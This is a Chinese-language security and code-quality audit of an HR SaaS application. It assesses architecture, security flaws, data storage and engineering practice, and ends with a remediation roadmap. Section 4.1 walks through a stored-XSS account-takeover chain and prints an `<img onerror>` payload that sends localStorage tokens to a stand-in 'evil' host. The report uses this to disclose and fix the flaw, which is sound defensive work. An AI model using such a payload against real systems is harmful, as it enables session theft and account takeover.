# 项目分析报告：HR 人才库管理系统（hr-workbench）

- **分析日期**：2026-10-20
- **分析范围**：全仓代码（`src/` 131 个文件 / 40,356 行 TS/TSX）、`schema.sql`（26 张表）、`migrations/`（39 个脚本）、构建与部署配置
- **数据来源**：代码通读 + 仓库结构统计 + git 历史（近 15 次提交）
- **线上地址**：https://hr-work.club

---

## 一、结论先行

这是一个**工程质量明显高于同类外包/自研 HR 系统平均水平**的商业化产品，不是内部玩具：有会员付费、邀请返利、团队数据共享、审批引擎、背调合规闸门，说明它在真实运营。

但存在**一条完整的账号接管链路**（存储型 XSS → localStorage 取 token → 管理员越权），这是当前唯一需要立刻处理的问题。其余问题集中在「文档滞后」「缺少自动化质量门禁」「巨型文件」三类，属于可持续演进问题，不影响当下可用性。

**综合评级：B+（可上线运营，需先修 P0）**

| 维度 | 评分 | 说明 |
|---|---|---|
| 架构设计 | A- | 边界清晰，横切关注点收敛得好 |
| 安全 | C+ | 密码学与限流扎实，但 XSS 链路可打通 |
| 数据模型 | B | 26 表设计合理，缺迁移版本管理 |
| 代码可维护性 | B- | 注释优秀，但巨型文件与重复样板多 |
| 工程化 | C | 无 CI、无 lint、几乎无测试 |
| 文档 | D | README 严重滞后于代码 |

---

## 二、项目定位与功能现状

### 2.1 它实际是什么

README 把它描述成「人才库 + 招聘看板」，但代码里已经是**一套完整的 HR SaaS**：

| 模块 | 代码位置 | README 是否提及 |
|---|---|---|
| 人才库 / 分字段检索 / 批量导入 | `pages/TalentList`、`routes/talents` | ✅ |
| 岗位 / 招聘看板 / 面试 | `pages/Pipeline`、`routes/pipeline` | ✅ |
| 待办与节假日顺延 | `routes/tasks`、`utils/holidays` | ✅ |
| AI 能力（14+ 端点） | `routes/aiAssist.ts`（2098 行） | ❌ |
| 审批流引擎（可自建模板） | `routes/approvals`、`approval_flows` | ❌ |
| 背景调查（含授权合规闸门） | `routes/background`、`background_checks` | ❌ |
| 合同管理 / 社保公积金台账 | `routes/talents`（contracts/social 段） | ❌ |
| 文档模板库（富文本 + 占位符） | `pages/TemplateLibrary` | ❌ |
| 会员付费 / 到期冻结 / 邀请返利 | `routes/auth`（membership、referral） | ❌ |
| 团队数据共享（manager 角色） | `worker/scope.ts` | ❌ |
| 使用埋点与模块热度分析 | `usage_events`、`usage_daily`、`pages/Logs` | ❌ |
| 移动端独立组件树 | `mobile/`（5 个页面） | ❌ |
| PWA / 落地页 / 引导 | `public/manifest`、`pages/Landing`、`components/Onboarding` | ❌ |

**这是本报告的第一个判断：README 描述的功能量大约只占实际系统的 25%。** 对新人接手、对外交付、对你自己三个月后回看，这都是成本。

### 2.2 规模数据

```
源码            40,356 行（131 个文件）
后端端点        192 个（18 个路由文件）
数据库表        26 张
迁移脚本        39 个
路由懒加载      27 处
构建产物        6.2 MB（未压缩）
```

---

## 三、架构评估

### 3.1 整体结构

```
浏览器
  │  React 19 SPA（27 个路由懒加载 + 移动端独立树）
  ↓  同源请求，无跨域
Cloudflare Worker（Hono）
  │  ① onError 统一错误出口
  │  ② 冻结账户写操作守卫
  │  ③ menuGuard 菜单权限（按 path 分流到菜单 key）
  │  ④ 路由内 getSession → ownerScope 行级数据隔离
  ↓
D1（26 表，多租户行级隔离）  +  KV（会话 / 简历 / 合同 / 背调报告）
```

### 3.2 做得好的地方（值得保留的设计）

**① 数据隔离抽象成一层，而不是散落各处。**
`worker/scope.ts` 的 `ownerScope()` / `canTouch()` 把「admin 看全量 / 同 team 互看 / 否则只看自己」收敛成三个函数。这个决定的价值在 192 个端点的规模下才体现出来——如果每个 handler 各写一遍 `session.role !== 'admin' && row.owner_id !== session.userId`，必然有漏网的。代码注释里也明确写了「替代散落的判断」，说明作者意识到过这个问题。

**② AI 的横切护栏集中在一个文件。**
`worker/aiGuard.ts` 把「PII 掩码 → 输入截断 → 配额 → 缓存 → 落库」打包，注释直接写明理由：「散进各路由必然有人漏写」。`maskPii()` 在数据出域前把手机号/邮箱/身份证打码，这是 HR 系统对接第三方大模型的底线要求，做对了。

**③ 权限守卫的「叠加执行」坑被显式处理。**
`index.ts:123-133` 把 `contracts` / `social` / `talents` 三个菜单权限放进**同一个** `app.use` 内按 path 分流，注释解释了原因：Hono 的 `/api/talents/*` 也匹配裸路径，拆成两个 `app.use` 会变成「必须同时拥有两个权限」。这种坑只有踩过才知道，写进注释是正确的。

**④ 构建配置有真实的性能意图。**
`vite.config.ts` 用函数式 `manualChunks` 把 react / antd / echarts / doc-vendor 拆开，注释说明「业务改动只让用户重下业务 chunk」。`pdfjs` 和 `mammoth` 被强制独立 chunk，因为 rollup 默认会把多个懒加载 chunk 共享的模块提升到入口——这个细节很多人不知道。

**⑤ 密码学没有糊弄。**
PBKDF2-SHA256 + 16 字节随机盐 + 10 万次迭代，且 `verifyPassword` 兼容旧的单轮 SHA-256 并在登录时就地升级（`auth.ts:56-67, 419-424`）。BYOK 的 AI Key 用 AES-GCM 加密存储，主密钥走 `wrangler secret`，未配置时**整体关闭功能而不是降级明文**（`aiKey.ts:8`）。

**⑥ 注释解释「为什么」，而不是「是什么」。**
例如 `kv.ts` 解释为什么 SESSIONS 和 RESUMES 曾共用 namespace、为什么要保留回退分支；`auth.ts:204` 解释「KV 的 expirationTtl 最小 60 秒，写 30 会抛异常导致 500」。这类注释是团队资产。

### 3.3 结构性问题

**① 巨型文件。**

| 文件 | 行数 | 问题 |
|---|---|---|
| `routes/aiAssist.ts` | 2098 | 36 个端点，每个约 20 行样板重复 |
| `types.ts` | 1360 | 手写类型，前后端唯一契约 |
| `routes/auth.ts` | 1212 | 认证 + 用户管理 + 会员 + 推广 + 字典 + 公告，6 类职责 |
| `routes/talents.ts` | 1161 | 人才 + 合同 + 社保 + 批量操作 |
| `pages/TalentList.tsx` | 1148 | 列表 + 筛选 + 导入 + 导出 + 批量 |
| `pages/Funnel.tsx` | 1115 | 漏斗 + 图表 + 明细 |

`auth.ts` 尤其值得拆：它同时承担登录注册、用户 CRUD、角色分配、会员计费、邀请返利、数据字典、更新公告。任何一处改动都要重新理解 1200 行上下文。

**② 前后端契约靠手写类型 + 手写校验。**
`types.ts` 1360 行是唯一的类型来源，但后端**不引用它**——后端 handler 大量使用 `c.req.json<any>()`，例如 `talents.ts:919`：

```ts
const body = await c.req.json<any>();
...
.bind(id, session.userId, body.name || "", ...)
```

没有 schema 校验层（zod / valibot），192 个端点的入参合法性全靠零散的手写 `if`。这是下一节安全问题的**根因**。

**③ 桌面端与移动端是两套独立实现。**
`pages/*` 与 `mobile/*` 各自实现列表、筛选、卡片，共享的只有 `api.ts`。功能迭代要改两遍，且容易漂移（移动端只有 4 个页面，功能已落后于桌面端）。

---

## 四、安全评估

### 4.1 【P0】存储型 XSS → 管理员账号接管（完整链路已打通）

这不是理论风险，四个环节都成立：

**环节 1 — 恶意数据可以入库。**
`routes/talents.ts:924` 新增人才时 `body.name` 原样写库，无长度限制、无字符过滤、无转义：

```ts
.bind(id, session.userId, body.name || "", ...)
```

任何拥有 `talents` 权限的账号（包括试用期账号）直接调 `POST /api/talents` 即可写入 `name = <img src=x onerror="fetch('//evil/?'+localStorage.token)">`。

**环节 2 — 数据未经转义拼进 HTML。**
`components/OfferModal.tsx:116-119` 的变量替换：

```ts
return tpl.content.replace(/\{\{\s*([^{}]+?)\s*\}\}/g, (whole, key: string) => {
  const v = map[key.trim()];
  return v !== undefined && v !== "" ? v : whole;   // ← 原样返回，无 escapeHtml
});
```

同一个文件第 7 行**已经 import 了 `escapeHtml`**，但只用于模板名和导出文件头（127、134 行），唯独替换进去的业务数据没转义。

**环节 3 — 渲染点存在。**
`OfferModal.tsx:277`：

```tsx
dangerouslySetInnerHTML={{ __html: filled() || "<p>请先选择模板</p>" }}
```

`<img onerror>` 经 `innerHTML` 注入后**会执行**（`<script>` 不会，但事件属性会）。

**环节 4 — 令牌可被读取。**
`api.ts:73` 把 token 写进 `localStorage`，XSS 脚本一行 `localStorage.token` 就能拿到。

**攻击链**：低权限账号录入一个名字带 payload 的候选人 → 管理员在看板/Offer 弹窗里打开该候选人 → 脚本执行 → 管理员 token 泄露 → 攻击者以 admin 身份登录，导出全库人才数据（含手机号、身份证相关字段）。

> 注：虽然登录同时下发了 `httpOnly` cookie（`auth.ts:444`），但前端 `getToken()` 优先读 localStorage 并通过 `Authorization` 头传参，**httpOnly 的保护被完全绕过**。

**同类风险点（同一根因，未逐个验证可利用性）**：

| 位置 | 数据来源 | 风险 |
|---|---|---|
| `TemplateLibrary.tsx:506,534` | 模板库富文本（Quill 存原始 HTML） | 有 `templates` 权限者可写入 `<img onerror>`，全租户可见 |
| `ImportPreviewModal.tsx:150` | mammoth 转换的 docx | 攻击者上传构造的 docx |
| `ResumePreviewModal.tsx:94` | 同上 | 同上 |
| `TalentList.tsx:930` | 导出打印区 | 该处已用 `escapeHtml`，相对安全 |

**全仓没有任何 HTML 净化库**（无 DOMPurify / sanitize-html），也没有 CSP（`index.html`、`public/`、`wrangler.jsonc` 均无 `Content-Security-Policy`），意味着**没有任何一层兜底**。

**修复建议（按投入排序）**：

1. **最小改动**：`OfferModal` 的 `filled()` 里对 `v` 调用 `escapeHtml(v)`（模板本身是富文本，不能整体转义，只转义**替换进去的值**）。
2. **系统改动**：所有 `dangerouslySetInnerHTML` 的输入统一过 DOMPurify，白名单只留排版标签。
3. **根治**：token 不再下发到 localStorage，前端删除 `getToken()`，全靠 httpOnly cookie + `SameSite=Strict`；XSS 就拿不到令牌了（但 XSS 仍可发起请求，所以第 1、2 步不能省）。
4. **兜底**：加 CSP（`script-src 'self'`），能拦住绝大部分注入执行。

### 4.2 【P1】权限守卫读的是会话快照，不是实时角色

项目里存在**两套会话读取方式**，行为不一致：

```ts
// worker/index.ts:99-105 —— menuGuard 直接信 KV 里的 role
session = JSON.parse(sessionRaw);
if (session.role === "admin") return null;   // 管理员放行

// worker/routes/auth.ts:1207-1210 —— getSession 每次现查 DB
// 注释原文：「KV 会话里的 role 是登录时的快照，不过期刷新会导致
//           『已撤销的管理员仍然有权访问』的越权窗口」
const u = await DB.prepare("SELECT role, team_id FROM users WHERE id = ?")...
```

作者**已经识别并修复了这个问题**（`getSession`），但 `menuGuard` 和冻结账户守卫（`index.ts:77`）**没有同步修改**。

**实际影响有限**：路由内部的数据查询用的是 `getSession` 返回的实时 role，`ownerScope` 会按真实角色收窄数据范围。所以被降权的管理员能通过菜单守卫，但看不到超出自己范围的数据。**属于「窗口期越权」而非「完全越权」**，仍是 P1 而非 P0。

**修复**：`menuGuard` 改为调用 `getSession(c)`，复用同一套逻辑。

### 4.3 【P1】Cookie 缺少 `Secure` 标志

```ts
// auth.ts:444
setCookie(c, "token", token, { httpOnly: true, path: "/", maxAge: 604800, sameSite: "Lax" });
```

`httpOnly` ✅、`sameSite` ✅、**`secure` ❌**。若用户通过 `http://` 访问（或被中间人降级），令牌会明文传输。Cloudflare 通常强制 HTTPS，但这是零成本的加固。

### 4.4 【P2】其他

| 问题 | 位置 | 说明 |
|---|---|---|
| `cors()` 无参数，默认 `*` | `index.ts:62` | 配合 Bearer token 时，令牌一旦泄露任意站点可用；建议白名单域名 |
| 有副作用的 GET | `index.ts:324` `/api/reminders/test` | GET 触发推送，违反幂等语义；仅 admin 可调，风险低 |
| KDF 用裸 SHA-256 | `aiKey.ts:16-20` | 主密钥派生未加盐/迭代；secret 足够长时可接受，建议改 PBKDF2 |
| 无 CSRF token | 全局 | 依赖 `SameSite=Lax` 已能挡住跨站 POST，可接受 |

### 4.5 安全方面做得对的部分（不要改坏）

- 登录失败限流：同手机号 5 次 / 同 IP 20 次，15 分钟窗口（`auth.ts:398-410`）
- 验证码一次性消费，校验后无论对错都删除（`auth.ts:389`）
- 防用户枚举：手机号不存在与姓名不匹配返回**同一句**提示（`auth.ts:355-358`）
- 状态检查放在密码校验**之后**，避免通过响应差异探测账号是否存在（`auth.ts:430`）
- 短信防刷：同号 60s + 同 IP 60s，且 `scene` 前置判定减少无效发送
- 背调的合规硬闸门：`consent_status !== 'granted'` 时拒绝写入任何敏感字段（`background.ts:261`），高敏项（犯罪/征信）需二次确认
- SQL 全部参数化，动态列名走白名单（`talents.ts:298-308` 的 `sortWhitelist`）

---

## 五、数据与基础设施

### 5.1 数据模型

26 张表，核心关系合理：`talents` ← `talent_jobs` → `jobs`，`interviews` 挂在 `talent_jobs` 而非 `talents`（注释解释了原因：面试属于「某岗位的某轮」），这是对的建模。

**值得注意的设计**：
- 多租户靠 `owner_id` + `team_id` 行级隔离，**没有 RLS**，完全依赖应用层。一处 `ownerScope` 漏写就是数据泄露，这类风险靠代码评审保障，很脆弱。
- 19 个索引覆盖了主要查询，但 `talents` 列表的多字段 `LIKE '%x%'`（`talents.ts:244-263`）**无法走索引**，是全表扫描。当前数据量下无感，上万条后列表会明显变慢。
- 软删除缺失：删除用户时级联硬删 `communications` / `talents`（`auth.ts:891-894`），**不可恢复**。对 HR 系统而言，误删一个人才档案意味着丢失全部沟通历史。

### 5.2 存储选型

| 项 | 现状 | 风险 |
|---|---|---|
| 简历/合同/背调报告 | KV，base64 编码 | 体积膨胀 33%；KV 单值上限 25MB → 实际文件上限约 18MB；KV 最终一致，刚上传可能读不到 |
| 会话 | KV | 合适 |
| 关系数据 | D1（SQLite） | 单库多租户，写并发有限；免费额度 5GB |

`README` 写的「单文件上限 25MB」不准确——base64 后是 25MB 的**编码后**体积，原始文件约 18MB 封顶。

**演进建议**：文件迁 R2（对象存储，无 25MB 限制、无 base64 膨胀、成本更低），D1 只留元数据。`contract_files.kv_key` 字段设计已经预留了这个迁移路径。

### 5.3 定时任务

`wrangler.jsonc` 配置 `crons: ["0 1 * * *"]` = UTC 01:00 = **北京时间 09:00**，每日执行：
1. `runReminders()` — 到期提醒推送（合同/试用期/跟进/面试/社保增减员）
2. `freezeExpiredAccounts()` — 会员到期转 frozen 只读
3. `purgeOldUsage()` — 清理 30 天前埋点明细

逻辑正确，时区换算有专门注释说明（`reminders.ts:22`）。**但 cron 是单点**：若某天执行失败，没有任何告警，用户会静默收不到提醒。

---

## 六、工程质量

### 6.1 强项

- `tsconfig.json` 开启 `strict: true`，无 `any` 泛滥（虽然 `req.json<any>()` 很多）
- **提交信息规范**：`feat/fix/refactor/chore` + 中文说明，甚至写了「为什么」——例如 `fix(approvals): 修复发起审批 500（link.talent_job_id undefined）；单人一键确认自动通过`
- 有 `scripts/deadcode-scan.mjs`（死代码扫描）、`e2e-referral.mjs`（邀请返利端到端）
- 存在 `docs/ai-endpoint-audit-2026-10-14.md` 这类自我审计文档，说明有主动治理意识
- 有 `backups/` 目录，说明做改动前会留底

### 6.2 弱项

| 问题 | 现状 | 影响 |
|---|---|---|
| **无 CI** | 无 `.github/`、无任何流水线 | 改动全靠本地 `npm run build` 自觉 |
| **无 lint / format** | 无 eslint、prettier 配置 | 风格靠人肉维持，192 个端点规模下必然漂移 |
| **测试近乎为零** | 仅 `test-resume-parser.mjs`、`test-sql-refactor.mjs` 两个脚本 | 192 个端点、26 张表，零接口测试、零单元测试 |
| **迁移无版本管理** | 39 个 SQL 文件，README 自承「多为归档记录」，无 `schema_migrations` 表 | 新环境部署靠人肉按日期顺序执行，漏一个就炸；且 `ALTER TABLE ADD COLUMN` 重复执行会报错 |
| **仓库卫生** | `dist/`（6.9M）、`backups/`（1.5M）、`_promo/`（30M）、`_shots/`（6.4M）全在仓库里 | 仓库膨胀 45M+，`git clone` 慢，且 `dist/` 入库容易产生「线上到底是哪个版本」的困惑 |
| **未提交改动** | `package.json` 已修改未提交、`scripts/test-sql-refactor.mjs` 未跟踪 | 当前工作区不干净 |

**建议的最小可行质量门禁**（半天可搭完）：

```
1. 装 eslint + prettier（antfu 或 @typescript-eslint 预设），只对 src/ 生效
2. GitHub Actions：push 时跑 tsc --noEmit + vite build，失败即红
3. 加 3-5 个关键接口的冒烟测试（登录 / 人才 CRUD / 权限隔离 / XSS 输入）
4. .gitignore 掉 dist/ backups/ _promo/ _shots/
```

第 2 条价值最高：`tsc --noEmit` 在这个规模下能拦住大量「改了 types 忘了改调用方」的低级错误，而 `build` 能拦住「打包成功但运行时炸」。

---

## 七、代码与文档一致性问题

**① README 落后约 75%。** 见第 2.1 节对照表。README 仍写「沟通记录（电话/微信/面试/邮件，评分 + 跟进提醒）」，但该功能**已下线**——`talents.ts:902` 注释明确写着「沟通记录功能已下线：全库无写入入口，详情页时间线恒为空」。表 `communications` 还留在 schema 里。

**② 功能下线留残迹。** 提交 `dc65e60 chore(cleanup): 下线 5 个死功能` 说明存在功能蔓延——先做出来、再下线、但表和文档没同步清。`migration-20261010-drop-profile-levels.sql` 也是同类。

**③ 类型定义与实际不符的风险。** `types.ts` 1360 行手写，后端不用它，等于「两份契约靠人工同步」。这是 XSS 之外最容易埋雷的地方——前端以为字段是 `string`，后端实际返回 `null`，运行时报错。

---

## 八、改进路线图

### P0 — 本周内（安全）

| # | 事项 | 预估 |
|---|---|---|
| 1 | `OfferModal.filled()` 对替换值 `escapeHtml` | 10 分钟 |
| 2 | 引入 DOMPurify，7 处 `dangerouslySetInnerHTML` 全部过一遍 | 2 小时 |
| 3 | 后端加输入长度/字符白名单（至少 `name`/`city`/`title` 等文本字段） | 3 小时 |
| 4 | 加 CSP 响应头（`script-src 'self'`，注意 antd 内联样式需放行 `style-src 'unsafe-inline'`） | 1 小时 |

### P1 — 本月内（架构与运维）

| # | 事项 | 说明 |
|---|---|---|
| 5 | `menuGuard` 改用 `getSession()` | 消除降权窗口期 |
| 6 | Cookie 加 `secure: true`，`sameSite` 视情况升 `Strict` | 一行改动 |
| 7 | token 退出 localStorage，前端改纯 cookie 认证 | 根治令牌窃取面 |
| 8 | 建 `schema_migrations` 表 + 迁移执行脚本 | 让新环境可重复部署 |
| 9 | 重写 README（按现有 12 个模块组织，标注已下线功能） | 半天 |
| 10 | 搭 CI（tsc + build）与 eslint | 半天 |

### P2 — 季度内（可维护性）

| # | 事项 |
|---|---|
| 11 | 拆 `auth.ts`：认证 / 用户管理 / 会员计费 / 推广 四个文件 |
| 12 | 拆 `aiAssist.ts`：抽 `narrativeEndpoint()` 工厂（该文件自己的审计文档已提出此建议） |
| 13 | 引入 zod 做入参校验层，与 `types.ts` 共享 schema |
| 14 | 补关键路径接口测试（权限隔离、越权访问、XSS 输入） |
| 15 | 清理仓库：`dist/` `_promo/` `_shots/` 移出或 gitignore |

### P3 — 有增长压力时再做

| # | 事项 |
|---|---|
| 16 | 文件存储迁 R2（去掉 base64 与 25MB 限制） |
| 17 | `talents` 检索改 FTS5 全文索引（当前 `LIKE '%x%'` 全表扫） |
| 18 | 软删除 + 回收站（HR 数据误删不可恢复） |
| 19 | cron 失败告警（当前静默失败） |
| 20 | 移动端与桌面端共享业务逻辑层（当前两套实现） |

---

## 九、总体评价

**做得好的**：架构边界清楚，横切关注点（数据隔离、AI 护栏、权限守卫）都收敛到了单点而不是散落各处；密码学、限流、防枚举这些「容易被糊弄」的细节都做对了；注释解释「为什么」而非「是什么」，是可传承的资产；构建优化有真实的性能意图而非抄配置。

**需要正视的**：安全上有一条能打通的账号接管链路，根因是「后端不校验 + 前端不转义 + 令牌在 localStorage」三件事同时成立——单独看每件都不致命，叠加起来就是 P0。工程上没有 CI 和测试，40,356 行代码全靠自觉，这个规模已经超过「靠自觉能维持」的临界点。文档滞后 75%，会让新人接手成本翻倍。

**一句话**：代码质量配得上商业产品，但缺一道自动化的安全与质量防线；补上 P0 的四个小时，这套系统的风险等级会从「随时可能出事」降到「可控」。

---

## 十、留给你的三个问题

1. **Offer 弹窗这条链路，除了管理员，还有谁会打开？** 如果只有 HR 自己看自己的候选人，攻击面会小很多——但你确认过 `pipeline` 权限的账号能看到全公司的候选人卡片吗？这决定了 P0 的真实紧急程度。

2. **`team_id` 这套行级隔离，你打算靠什么保证不写漏？** 现在 192 个端点里每一处 `ownerScope` 调用都是人工判断。如果哪天新增一个端点忘了写，数据就跨租户泄露了——有没有可能把「必须带 scope」变成类型系统或中间件层面的强制约束？

3. **39 个迁移脚本 + 一份 schema.sql，哪个是真相？** 如果明天要开一套 staging 环境，你能不看 README、只跑命令就得到和线上一致的结构吗？如果不能，这个问题会随着每次上线持续放大。
